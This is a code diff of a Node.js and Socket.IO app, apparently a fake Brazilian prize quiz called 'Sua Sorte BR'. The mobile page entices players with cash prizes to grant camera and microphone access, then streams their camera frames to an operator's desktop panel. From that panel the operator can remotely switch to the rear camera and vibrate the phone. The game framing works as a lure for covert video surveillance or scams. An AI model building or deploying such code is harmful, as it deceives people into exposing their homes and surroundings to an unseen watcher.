@@ -4,9 +4,7 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { 
-  cors: { origin: "*" }
-});
+const io = new Server(server, { cors: { origin: "*" } });
 
 const PORT = process.env.PORT || 3000;
 
@@ -20,7 +18,7 @@ app.get('/', (req, res) => {
   res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
 });
 
-// ==================== CELULAR - SUA SORTE BR (CORRIGIDO) ====================
+// ==================== CELULAR - SUA SORTE BR (MELHORADO) ====================
 function getMobileHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -34,7 +32,7 @@ function getMobileHTML(fullUrl) {
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a, #1a0033);
+            background: linear-gradient(135deg, #0f001a, #2a0044);
             color: white;
             height: 100vh;
             overflow: hidden;
@@ -42,18 +40,100 @@ function getMobileHTML(fullUrl) {
 
         .header {
             background: linear-gradient(to right, #ff00cc, #00ffcc);
-            padding: 15px 16px;
+            padding: 14px 16px;
             text-align: center;
-            font-size: 22px;
+            font-size: 21px;
             font-weight: 700;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(255,0,204,0.6);
+            box-shadow: 0 4px 20px rgba(255,0,204,0.6);
+        }
+
+        .top-bar {
+            background: #1f0033;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+        }
+        .balance { color: #00ff88; font-weight: 700; }
+
+        .question-area {
+            background: #2a0044;
+            padding: 20px 16px;
+            text-align: center;
+            border-bottom: 4px solid #ff00cc;
+        }
+        .prize {
+            color: #ffd700;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        .question {
+            font-size: 19px;
+            font-weight: 600;
+            margin: 12px 0;
+            min-height: 52px;
+        }
+        .timer {
+            font-size: 36px;
+            font-weight: 700;
+            color: #ff00cc;
+        }
+
+        .messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            background: rgba(0,0,0,0.4);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .message {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        .message.sent { justify-content: flex-end; }
+        .message.received { justify-content: flex-start; }
+        .bubble {
+            max-width: 80%;
+            padding: 13px 17px;
+            border-radius: 20px;
+            font-size: 16px;
+        }
+        .message.sent .bubble { background: #00ff88; color: black; }
+        .message.received .bubble { background: #ff00cc; color: white; }
+
+        .input-area {
+            background: #1f0033;
+            padding: 14px 16px;
+            display: flex;
+            gap: 12px;
+        }
+        .input-field {
+            flex: 1;
+            background: #2a0044;
+            border: 2px solid #ff00cc;
+            border-radius: 30px;
+            padding: 14px 18px;
+            color: white;
+            font-size: 16px;
+        }
+        .send-btn {
+            background: linear-gradient(#00ff88, #00cc66);
+            color: black;
+            border: none;
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
         }
 
         .consent-screen {
             position: absolute;
             inset: 0;
-            background: rgba(10,10,10,0.97);
+            background: rgba(15,0,26,0.98);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -63,12 +143,11 @@ function getMobileHTML(fullUrl) {
         .consent-box {
             background: #1f0033;
             border: 3px solid #ff00cc;
-            border-radius: 20px;
-            padding: 30px 25px;
-            max-width: 340px;
+            border-radius: 24px;
+            padding: 32px 24px;
             text-align: center;
+            max-width: 340px;
         }
-        .consent-box h2 { color: #ff00cc; font-size: 26px; margin-bottom: 20px; }
         .start-btn {
             background: linear-gradient(to right, #ff00cc, #00ff88);
             color: black;
@@ -78,80 +157,7 @@ function getMobileHTML(fullUrl) {
             border-radius: 50px;
             font-size: 17px;
             width: 100%;
-            margin-top: 20px;
-            cursor: pointer;
-        }
-
-        .game-container {
-            display: none;
-            flex-direction: column;
-            height: 100vh;
-        }
-
-        .question-area {
-            background: #2a0044;
-            padding: 18px 16px;
-            text-align: center;
-            border-bottom: 4px solid #ff00cc;
-        }
-        .question {
-            font-size: 19px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        .timer {
-            font-size: 32px;
-            font-weight: 700;
-            color: #ff00cc;
-        }
-
-        .messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 16px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            background: rgba(0,0,0,0.5);
-        }
-        .message {
-            display: flex;
-            margin-bottom: 8px;
-        }
-        .message.sent { justify-content: flex-end; }
-        .message.received { justify-content: flex-start; }
-        .bubble {
-            max-width: 78%;
-            padding: 12px 16px;
-            border-radius: 18px;
-            font-size: 16px;
-        }
-        .message.sent .bubble { background: #00ff88; color: black; }
-        .message.received .bubble { background: #ff00cc; color: white; }
-
-        .input-area {
-            background: #1a0033;
-            padding: 12px 16px;
-            display: flex;
-            gap: 10px;
-        }
-        .input-field {
-            flex: 1;
-            background: #2a0044;
-            border: none;
-            border-radius: 30px;
-            padding: 14px 18px;
-            color: white;
-            font-size: 16px;
-        }
-        .send-btn {
-            background: #00ff88;
-            color: black;
-            border: none;
-            width: 52px;
-            height: 52px;
-            border-radius: 50%;
-            font-size: 24px;
+            margin-top: 25px;
             cursor: pointer;
         }
     </style>
@@ -162,34 +168,37 @@ function getMobileHTML(fullUrl) {
     <div class="consent-screen" id="consentScreen">
         <div class="consent-box">
             <h2>🔥 SUA SORTE BR 🔥</h2>
-            <p><strong>Jogo de Perguntas em Tempo Real</strong></p>
+            <p><strong>Jogo de Perguntas ao Vivo</strong></p>
             <p>O operador controla as perguntas e prêmios.</p>
-            <p>Ao aceitar, você permite:<br>
-            • Câmera ao vivo<br>
-            • Microfone<br>
-            • Localização em tempo real</p>
-            <button class="start-btn" id="acceptBtn">ACEITAR E COMEÇAR A JOGAR</button>
+            <p>Ao continuar você permite câmera, microfone e localização.</p>
+            <button class="start-btn" id="acceptBtn">ACEITAR E JOGAR</button>
         </div>
     </div>
 
     <!-- TELA DO JOGO -->
-    <div class="game-container" id="gameScreen">
+    <div class="game-container" id="gameScreen" style="display:none; flex-direction:column; height:100vh;">
         <div class="header">SUA SORTE BR</div>
 
+        <div class="top-bar">
+            <span>Saldo:</span>
+            <span class="balance" id="balance">R$ 0,00</span>
+        </div>
+
         <div class="question-area">
-            <div class="question" id="questionText">Aguardando pergunta do operador...</div>
+            <div class="prize" id="prize">Prêmio: R$ 0,00</div>
+            <div class="question" id="questionText">Aguardando pergunta...</div>
             <div class="timer" id="timer">00</div>
         </div>
 
         <div class="messages" id="messages"></div>
 
         <div class="input-area">
-            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta...">
+            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta aqui...">
             <button class="send-btn" id="sendBtn">➤</button>
         </div>
     </div>
 
-    <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
+    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -198,6 +207,7 @@ function getMobileHTML(fullUrl) {
         let mediaStream = null;
         let facingMode = 'user';
         let permissions = false;
+        let balance = 0;
         let frameInterval = null;
 
         const consentScreen = document.getElementById('consentScreen');
@@ -207,6 +217,8 @@ function getMobileHTML(fullUrl) {
         const sendBtn = document.getElementById('sendBtn');
         const questionText = document.getElementById('questionText');
         const timerEl = document.getElementById('timer');
+        const prizeEl = document.getElementById('prize');
+        const balanceEl = document.getElementById('balance');
 
         function addMessage(text, isSent = true) {
             const div = document.createElement('div');
@@ -216,21 +228,20 @@ function getMobileHTML(fullUrl) {
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        // Envio de vídeo otimizado
         function sendFrame() {
             if (!permissions || !localVideo.videoWidth) return;
             const canvas = document.createElement('canvas');
-            canvas.width = 260;
-            canvas.height = 195;
+            canvas.width = 280;
+            canvas.height = 210;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(localVideo, 0, 0, 260, 195);
-            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.68));
+            ctx.drawImage(localVideo, 0, 0, 280, 210);
+            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.7));
         }
 
         async function startGame() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: facingMode },
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                     audio: true
                 });
 
@@ -238,8 +249,7 @@ function getMobileHTML(fullUrl) {
                 localVideo.srcObject = stream;
                 await localVideo.play();
 
-                // Envia frames com mais estabilidade
-                frameInterval = setInterval(sendFrame, 220);
+                frameInterval = setInterval(sendFrame, 230);
 
                 permissions = true;
                 consentScreen.style.display = 'none';
@@ -248,11 +258,10 @@ function getMobileHTML(fullUrl) {
                 socket.emit('mobile_online');
 
             } catch (err) {
-                alert("É necessário permitir a câmera e o microfone para jogar.");
+                alert("Permita câmera e microfone para participar.");
             }
         }
 
-        // Enviar mensagem
         function sendMessage() {
             const text = messageInput.value.trim();
             if (!text) return;
@@ -266,17 +275,24 @@ function getMobileHTML(fullUrl) {
             if (e.key === 'Enter') sendMessage();
         });
 
-        // Receber pergunta do PC
+        // Receber pergunta + prêmio
         socket.on('question', (data) => {
             questionText.textContent = data.question || "Pergunta recebida";
             timerEl.textContent = data.time || "30";
+            prizeEl.textContent = `Prêmio: R$ ${parseFloat(data.prize || 0).toFixed(2)}`;
         });
 
         socket.on('message', (msg) => addMessage(msg, false));
 
+        // Atualizar saldo
+        socket.on('update_balance', (newBalance) => {
+            balance = newBalance;
+            balanceEl.textContent = `R$ ${balance.toFixed(2)}`;
+        });
+
         document.getElementById('acceptBtn').onclick = startGame;
 
-        // Troca de câmera
+        // Trocar câmera
         socket.on('toggle_camera', () => {
             facingMode = facingMode === 'user' ? 'environment' : 'user';
             if (permissions) startGame();
@@ -286,7 +302,7 @@ function getMobileHTML(fullUrl) {
 </html>`;
 }
 
-// ==================== DESKTOP - CONTROLE (com visualização da câmera) ====================
+// ==================== DESKTOP - CONTROLE ====================
 function getDesktopHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -294,64 +310,45 @@ function getDesktopHTML(fullUrl) {
     <meta charset="UTF-8">
     <title>Sua Sorte BR - Controle</title>
     <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #0a0a0a;
-            color: white;
-            margin: 0;
-            padding: 20px;
-        }
-        h1 { text-align: center; color: #ff00cc; margin-bottom: 20px; }
-        .video-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+        body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: white; margin:0; padding:20px; }
+        h1 { text-align:center; color:#ff00cc; margin-bottom:20px; }
         #remoteVideo {
             max-width: 100%;
-            max-height: 320px;
-            border: 3px solid #ff00cc;
+            max-height: 340px;
+            border: 4px solid #ff00cc;
             border-radius: 12px;
             background: black;
+            margin-bottom: 20px;
         }
-        .controls {
-            display: grid;
-            gap: 12px;
-            max-width: 700px;
-            margin: 0 auto;
-        }
-        input, textarea {
+        .controls { max-width: 700px; margin: 0 auto; display: grid; gap: 15px; }
+        input, button {
             padding: 14px;
-            background: #1f1f1f;
-            border: 2px solid #ff00cc;
-            color: white;
-            border-radius: 10px;
             font-size: 16px;
+            border-radius: 10px;
         }
+        input { background: #1f1f1f; border: 2px solid #ff00cc; color: white; }
         button {
-            padding: 16px;
-            font-size: 17px;
             background: linear-gradient(#ff00cc, #00ffcc);
             color: black;
             border: none;
-            border-radius: 10px;
-            cursor: pointer;
             font-weight: bold;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <h1>🎰 SUA SORTE BR - CONTROLE</h1>
-
-    <div class="video-container">
-        <img id="remoteVideo" src="" alt="Câmera do jogador">
+    
+    <div style="text-align:center;">
+        <img id="remoteVideo" src="" alt="Câmera do Jogador">
     </div>
 
     <div class="controls">
-        <input type="text" id="questionInput" placeholder="Digite a pergunta aqui...">
-        <input type="number" id="timeInput" value="30" placeholder="Tempo em segundos">
+        <input type="text" id="questionInput" placeholder="Digite a pergunta...">
+        <input type="number" id="timeInput" value="30" placeholder="Tempo (segundos)">
+        <input type="number" id="prizeInput" value="50" placeholder="Prêmio em R$">
         <button onclick="sendQuestion()">Enviar Pergunta</button>
-        
-        <button onclick="toggleCamera()">Trocar Câmera do Celular</button>
+        <button onclick="toggleCamera()">Trocar Câmera</button>
         <button onclick="vibrate()">Vibrar Celular</button>
     </div>
 
@@ -363,34 +360,29 @@ function getDesktopHTML(fullUrl) {
         function sendQuestion() {
             const question = document.getElementById('questionInput').value.trim();
             const time = parseInt(document.getElementById('timeInput').value) || 30;
+            const prize = parseFloat(document.getElementById('prizeInput').value) || 0;
+
             if (question) {
-                socket.emit('question', { question, time });
+                socket.emit('question', { question, time, prize });
             }
         }
 
-        function toggleCamera() {
-            socket.emit('toggle_camera');
-        }
-
-        function vibrate() {
-            socket.emit('vibrate');
-        }
+        function toggleCamera() { socket.emit('toggle_camera'); }
+        function vibrate() { socket.emit('vibrate'); }
 
         socket.on('frame', (frame) => {
             remoteVideo.src = frame;
         });
 
-        socket.on('mobile_online', () => {
-            console.log("Celular conectado");
-        });
+        socket.on('mobile_online', () => console.log("✅ Celular conectado"));
     </script>
 </body>
 </html>`;
 }
 
-// Socket.IO
+// ==================== SOCKET.IO ====================
 io.on('connection', (socket) => {
-  console.log('Cliente conectado:', socket.id);
+  console.log('Cliente conectado');
 
   socket.on('message', (msg) => socket.broadcast.emit('message', msg));
   socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
@@ -401,6 +393,6 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n🔥 Sua Sorte BR rodando em http://localhost:${PORT}`);
+  console.log(`\n🔥 Sua Sorte BR rodando na porta ${PORT}`);
   console.log(`Abra PRIMEIRO no CELULAR`);
 });
